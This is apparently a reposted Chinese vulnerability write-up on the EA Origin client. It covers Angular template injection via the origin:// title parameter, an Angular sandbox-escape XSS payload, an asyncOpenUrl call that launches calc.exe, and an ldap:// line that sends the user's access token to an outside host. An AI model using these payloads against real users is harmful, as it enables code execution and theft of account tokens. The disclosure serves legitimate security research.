### 文章来源
* * *

### 0x01 概述
本文将讨论我和我的好友（@Daley）在四月中旬发现的EA Origin客户端中的远程代码执行漏洞，以及我们在研究过程中挖掘出的其他安全问题。

### 0x02 调试Origin
通过QtWebEngine（基于Chromium内核的浏览器框架），我们可以调试并识别大部分问题。通过向Origin的核心进程传递特殊标识符，我能够将Chrome DevTools与该进程连接起来，从而可视化web视图。为实现远程调试，我还启用了Chrome DevTools端口转发功能。具体步骤如下：
1. 打开Chrome DevTools（在浏览器中输入 `chrome://inspect`）。
2. 在“Remote devices”选项卡中，按要求填写并开启端口转发。
3. 启动Origin时使用以下命令以启用远程调试：
   ```bash
   Origin.exe --remote-debugging-port=31337
   ```
4. 在Chrome浏览器中访问 `localhost:31337`，即可利用开发者工具对Origin进行调试。

### 0x03 Origin URL处理
利用URL进行攻击是黑客常用的手法之一。长期以来，这种方式被广泛应用于向远程计算机发送payload和执行代码。用户只需访问特定网页即可触发这些攻击，因此APT威胁者特别青睐这种方法。
自定义URL处理器通常是为了简化用户体验而设计的。例如，Origin的URL处理器允许用户通过web浏览器启动或购买游戏。当用户点击相关链接时，Origin客户端会通过特制的URL解析参数并启动相应的操作。
Origin支持多种URL参数选项。例如，要运行某个游戏，可以使用如下URL：
```plaintext
origin://game/launch/?offerIds=OFFERID
```
在此过程中，我们发现了第一个漏洞。

### 0x04 Bug#1：模板注入
如果Origin接收到一个无效的游戏ID，它会提示用户手动将其导入游戏库。此时弹出的对话框中会显示游戏名称（即"title"）。那么，如果这个ID无法被Origin识别会发生什么呢？这就是参数"title"的特殊之处。
通过篡改"title"值，我们进行了测试：
```plaintext
origin://game/launch/?offerIds=0&title=zer0pwn
```
初步测试显示存在HTML注入的可能性。进一步尝试后，我发现Origin前端框架是由Angular开发的，这让我想到了可能存在模板注入漏洞。使用payload `{{7*7}}`，结果返回49，证实了这一点：
```plaintext
origin://game/launch/?offerIds=0&title={{7*7}}
```

### 0x05 Bug#2：XSS
虽然我们发现了客户端模板注入漏洞，但其影响范围仅限于客户端。为了验证是否可以通过此漏洞执行JavaScript并窃取用户会话，我进行了更深入的研究。由于Angular具有沙盒策略，直接执行脚本较为困难。经过一番搜索，我找到了绕过其沙盒的方法。
将以下payload放入"title"字段中，成功实现了弹窗效果：
```javascript
{{a=toString().constructor.prototype;a.charAt=a.trim;$eval('a,alert(l),a')}}
```

### 0x06 Bug#3：RCE
接下来的部分涉及一个相对简单的远程代码执行漏洞。尽管QDesktopServices本身没有明显缺陷，但Origin在实现上存在问题。我找到了一种利用方法。
根据Qt文档，“QDesktopServices类提供了访问桌面服务的功能，如打开默认浏览器浏览网页”。我发现了一个暴露在外的SDK接口，允许通过JavaScript与QDesktopService通信。
查看DOM中的`Origin.client.desktopServices`对象，可以看到以下函数：
- `asyncOpenUrl()`
- `asyncOpenUrlWithEADPSSO()`
- `deminiaturize()`
- `flashIcon()`
- `formatBytes()`
- `getVolumeDiskSpace()`
- `isMiniaturized()`
- `miniaturize()`
- `moveWindowToForeground()`
- `setNextWindowUUID()`
- `showWindow()`

其中，`asyncOpenUrl()` 函数尤为关键。它可以调用QDesktopService的`openUrl`方法，进而打开浏览器或其他注册了特定URL的应用程序。利用这一特性，我构造了如下JavaScript payload，成功弹出了计算器程序：
```javascript
Origin.client.desktopServices.asyncOpenUrl("calc.exe")
```

### 0x07 进一步探索
尽管Origin采用了CSP策略来限制数据提取，但我发现了一种结合`ldap://`协议和`asyncOpenUrl()`函数的新方法，可以绕过这些限制。通过发送LDAP请求，可以在服务器端捕获到明文形式的数据。
示例代码如下：
```javascript
"ldap://safe.tld/o="+Origin.user.accessToken()+",c=UnderDog"
```
此外，`Origin.user`对象还包含许多有用的函数，包括但不限于：
- `accessToken()`
- `country()`
- `dob()`
- `email()`
- `emailStatus()`
- `globalEmailSignup()`
- `isAccessTokenExpired()`
- `originId()`
- `personaId()`
- `registrationDate()`
- `sessionGUID()`
- `showPersona()`
- `tfaSignup()`
- `underAge()`
- `userGUID()`
- `userPid()`
- `userStatus()`

### 0x08 关于补丁
虽然EA已经发布了针对上述漏洞的修复补丁，但在社交媒体上仍能看到不少绕过方法。这表明当前的补丁可能不够完善，再次提醒我们需要彻底清理各种类型的用户输入。

### 0x09 参考资料
* 
* 
* 

以上内容是对原文档的优化，使其更加清晰、连贯且专业。